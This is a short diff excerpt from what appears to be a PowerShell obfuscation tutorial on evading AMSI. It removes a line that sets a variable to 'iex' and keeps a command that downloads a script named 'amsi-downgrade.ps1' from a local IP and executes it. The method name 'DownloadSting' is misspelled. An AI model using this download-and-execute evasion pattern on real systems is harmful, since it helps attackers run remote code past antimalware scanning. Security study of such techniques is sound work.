@@ -755,7 +755,6 @@ Here we can view the all process of encoding/decoding in powershell console
 ![var declaration fail](http://i.cubeupload.com/b4lkyC.jpg)
 
         [Using Invoke-Command statement wrapped in double quotes]
-        $obf="iex"
         powershell -C "$obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')"
 
 ![var declaration success](http://i.cubeupload.com/o87JMY.jpg)
